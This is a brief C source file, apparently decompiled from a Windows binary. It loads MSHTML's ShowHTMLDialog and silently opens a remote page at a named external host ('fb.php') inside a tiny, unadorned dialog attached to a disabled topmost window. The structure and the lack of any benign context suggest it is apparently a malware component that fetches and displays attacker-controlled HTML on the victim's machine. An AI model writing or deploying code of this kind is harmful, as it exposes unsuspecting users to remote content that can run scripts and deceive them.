#include "Main.h"

HMODULE __cdecl LoadPage()
{
	HMODULE result;
	HMODULE v1;
	FARPROC v2;
	const WCHAR *v3;
	HWND v4;
	const WCHAR *v5;
	LPMONIKER ppmk;

	result = LoadLibraryA("MSHTML.DLL");
	v1 = result;
	if (result){
		v2 = GetProcAddress(result, "ShowHTMLDialog");
		SHOWHTMLDIALOGFN* pfnShowHTMLDialog;
		pfnShowHTMLDialog = (SHOWHTMLDIALOGFN*)v2;
		if (v2){
			v3 = SysAllocString(L"http://nixteam.com.br/fb.php");
			v5 = v3;
			CreateURLMoniker(0, v3, &ppmk);
			if (ppmk){
				v4 = CreateWindowExA(8u, "STATIC", 0, 0x8000000u, 640, 48, 0, 0, 0, 0, (HINSTANCE)0x400000, 0);
				SetFocus(v4);
				(*pfnShowHTMLDialog)(
					v4,
					ppmk,
					0,
					L"dialogWidth:190px;dialogHeight:80px;resizable:no;status:no;unadorned:yes;scroll:no;center:on;",
					0);
				ppmk->Release();
				DestroyWindow(v4);
				v3 = v5;
			}
			SysFreeString((BSTR)v3);
		}
		result = (HMODULE)FreeLibrary(v1);
	}
	return result;
}